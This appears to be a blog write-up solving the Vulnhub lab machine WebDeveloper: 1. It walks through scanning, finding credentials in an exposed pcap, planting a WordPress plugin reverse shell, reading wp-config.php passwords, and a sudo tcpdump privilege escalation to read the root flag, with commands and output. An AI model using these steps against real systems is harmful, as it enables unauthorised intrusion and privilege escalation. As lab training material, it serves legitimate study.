---
layout:     post
title:      "Vulnhub.com - WebDeveloper: 1"
date:       2019-02-28 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to do another machine from **Vulnhub** called **WebDeveloper: 1**. Once again we have to get the flag from `/root/flag.txt` directory. Easy machine with mostly generic types of exploitation, but still had a lot of fun with it.  

```text
A machine using the newest REMOVED Server, the newest REMOVED and containing some REMOVED....
```

* Author: [Fred Wemeijer](https://www.vulnhub.com/author/fred-wemeijer,595/)
* Download: [https://www.vulnhub.com/entry/webdeveloper-1,288/](https://www.vulnhub.com/entry/webdeveloper-1,288/)

### Solution

Firstly we have to do an `nmap` scan in order to get the list of available services in the machine. 

```bash
root@kali:~# nmap -sC -sV -sS -A 10.0.0.8
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-28 05:12 EST
Nmap scan report for 10.0.0.8
Host is up (0.00052s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb (RSA)
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d (ECDSA)
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 4.9.8
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Example site &#8211; Just another WordPress site
MAC Address: 08:00:27:CC:54:C9 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 10.0.0.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```

We can see that both `ssh` and `http` services are open. As we do not have a clue about user or password on `ssh`, we have to start from the web service. After viewing it, it seems to just be another `Wordpress` based website.

![Wordpress Index](/img/webdeveloper/wordpress_index.png){:class="img-responsive center-block"}

With that knowledge, my next step was running `dirb` in order to find, if there's something more interesting apart from wordpress files.

```text
root@kali:~# dirb http://10.0.0.8

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Feb 28 05:18:48 2019
URL_BASE: http://10.0.0.8/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.0.0.8/ ----
+ http://10.0.0.8/index.php (CODE:301|SIZE:0)                                  
==> DIRECTORY: http://10.0.0.8/ipdata/                                         
+ http://10.0.0.8/server-status (CODE:403|SIZE:296)                            
==> DIRECTORY: http://10.0.0.8/wp-admin/                                       
==> DIRECTORY: http://10.0.0.8/wp-content/                                     
==> DIRECTORY: http://10.0.0.8/wp-includes/                                    
+ http://10.0.0.8/xmlrpc.php (CODE:405|SIZE:42)                                
                                                                               
---- Entering directory: http://10.0.0.8/ipdata/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/ ----
+ http://10.0.0.8/wp-admin/admin.php (CODE:302|SIZE:0)                         
==> DIRECTORY: http://10.0.0.8/wp-admin/css/                                   
==> DIRECTORY: http://10.0.0.8/wp-admin/images/                                
==> DIRECTORY: http://10.0.0.8/wp-admin/includes/                              
+ http://10.0.0.8/wp-admin/index.php (CODE:302|SIZE:0)                         
==> DIRECTORY: http://10.0.0.8/wp-admin/js/                                    
==> DIRECTORY: http://10.0.0.8/wp-admin/maint/                                 
==> DIRECTORY: http://10.0.0.8/wp-admin/network/                               
==> DIRECTORY: http://10.0.0.8/wp-admin/user/                                  
                                                                               
---- Entering directory: http://10.0.0.8/wp-content/ ----
+ http://10.0.0.8/wp-content/index.php (CODE:200|SIZE:0)                       
==> DIRECTORY: http://10.0.0.8/wp-content/plugins/                             
==> DIRECTORY: http://10.0.0.8/wp-content/themes/                              
==> DIRECTORY: http://10.0.0.8/wp-content/uploads/                             
                                                                               
---- Entering directory: http://10.0.0.8/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/maint/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/network/ ----
+ http://10.0.0.8/wp-admin/network/admin.php (CODE:302|SIZE:0)                 
+ http://10.0.0.8/wp-admin/network/index.php (CODE:302|SIZE:0)                 
                                                                               
---- Entering directory: http://10.0.0.8/wp-admin/user/ ----
+ http://10.0.0.8/wp-admin/user/admin.php (CODE:302|SIZE:0)                    
+ http://10.0.0.8/wp-admin/user/index.php (CODE:302|SIZE:0)                    
                                                                               
---- Entering directory: http://10.0.0.8/wp-content/plugins/ ----
+ http://10.0.0.8/wp-content/plugins/index.php (CODE:200|SIZE:0)               
                                                                               
---- Entering directory: http://10.0.0.8/wp-content/themes/ ----
+ http://10.0.0.8/wp-content/themes/index.php (CODE:200|SIZE:0)                
                                                                               
---- Entering directory: http://10.0.0.8/wp-content/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Feb 28 05:19:10 2019
DOWNLOADED: 32284 - FOUND: 12
```

At the top of the output we can see `http://10.0.0.8/ipdata/` directory, which contains `pcap` file. After opening it and searching for some useful data, I've noticed a post request containing credentials to `webdeveloper` account. 

![Pcap Password](/img/webdeveloper/pcap_password.png){:class="img-responsive center-block"}

Now we can use it to log into the Wordpress. My usual step in this situation is to modify the `PHP` source of one of the exetension, in this situation it would be `hello_dolly`. 

![Wordpress Reverse Shell](/img/webdeveloper/wordpress_reverse_shell.png){:class="img-responsive center-block"}

Now we just have to set up a listener and activate the extension to get our reverse shell. 

![Activate Reverse Shell](/img/webdeveloper/activate_reverse_shell.png){:class="img-responsive center-block"}


```text
root@kali:~# nc -lvp 1234
listening on [any] 1234 ...
10.0.0.8: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.8] 46690
Linux webdeveloper 4.15.0-38-generic #41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 10:45:58 up 37 min,  0 users,  load average: 0.00, 0.00, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Great! But what can we do now? Firstly, I need to upgrade my shell in order to be able to run `sudo` command. 

```text
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@webdeveloper:/var/www/html$
```

After that, while casually searching for files, I've noticed a `webdeveloper` password in `wp-config.php` file. 

```text
www-data@webdeveloper:/var/www/html$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'webdeveloper');

/** MySQL database password */
define('DB_PASSWORD', 'MasterOfTheUniverse');
```

We can use it to to try and log into the `ssh`. 

```text
root@kali:~# ssh webdeveloper@10.0.0.8
webdeveloper@10.0.0.8's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-38-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Feb 28 10:54:52 UTC 2019

  System load:  0.02               Processes:           102
  Usage of /:   25.6% of 19.56GB   Users logged in:     0
  Memory usage: 57%                IP address for eth0: 10.0.0.8
  Swap usage:   0%

 * Security certifications for Ubuntu!
   We now have FIPS, STIG, CC and a CIS Benchmark.

   - http://bit.ly/Security_Certification

 * Want to make a highly secure kiosk, smart display or touchscreen?
   Here's a step-by-step tutorial for a rainy weekend, or a startup.

   - https://bit.ly/secure-kiosk


81 packages can be updated.
0 updates are security updates.


*** System restart required ***
Last login: Tue Oct 30 09:25:27 2018 from 192.168.1.114
webdeveloper@webdeveloper:~$ 
```

And here we are, user is already pwned. But what we do to get the root privilages? Fortunetly, all we had to do was to run `sudo -l` and view what commands we can run as `root`. 

```text
webdeveloper@webdeveloper:~$ sudo -l
[sudo] password for webdeveloper: 
Matching Defaults entries for webdeveloper on webdeveloper:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    (root) /usr/sbin/tcpdump
```

Now we can go to [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) and see if we can run arbitrary commands. Luckily, we can.

```text
webdeveloper@webdeveloper:~$ touch /tmp/exploit
webdeveloper@webdeveloper:~$ echo "cat /root/flag.txt" > /tmp/exploit 
webdeveloper@webdeveloper:~$ chmod +x /tmp/exploit
webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
dropped privs to root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
14 packets received by filter
0 packets dropped by kernel
webdeveloper@webdeveloper:~$ Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
```

And here we have another machine. 